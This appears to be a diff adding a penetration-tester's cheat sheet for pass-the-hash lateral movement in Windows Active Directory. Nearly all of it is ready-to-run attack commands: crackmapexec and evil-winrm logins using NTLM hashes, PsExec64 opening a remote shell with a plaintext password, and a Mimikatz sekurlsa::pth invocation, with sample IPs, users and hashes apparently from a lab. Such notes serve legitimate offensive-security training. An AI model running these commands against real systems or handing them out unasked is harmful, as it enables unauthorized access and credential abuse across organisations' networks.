@@ -1,0 +1,28 @@
+https://viperone.gitbook.io/pentest-everything/everything/everything-active-directory/lateral-movement/alternate-authentication-material/wip-pass-the-hash
+
+crackmapexec smb <IP> -u <User> -H <NTLM>
+crackmapexec smb '10.10.10.100' -u 'moe' -H '58a478135a93ac3bf058a5ea0e8fdb71'
+
+# local account login
+crackmapexec smb <IP> -u <User> -H <NTLM> --local-auth
+crackmapexec smb '10.10.10.100' -u 'moe' -H '58a478135a93ac3bf058a5ea0e8fdb71' --local-auth
+
+--------------------------------------------------------------
+#PsExec64
+1. User to be part of the Administrators local group.
+2. ADMIN$ share must be available
+3. File and Printer Sharing has to be turned on
+
+./PsExec64.exe -i  \\FILES04 -u corp\jen -p Nexus123! cmd
+
+--------------------------------------------------------------
+
+#EvilWinRM
+evil-winrm -i <IP> -u <User> -H <NThash>
+evil-winrm -i '10.10.10.100' -u 'moe' -H '58a478135a93ac3bf058a5ea0e8fdb71'
+
+--------------------------------------------------------------
+
+#Mimikatz
+Invoke-Mimikatz -Command '"sekurlsa::pth /user:username /domain:domain.tld /ntlm:NTLMhash /run:powershell.exe"' 
+
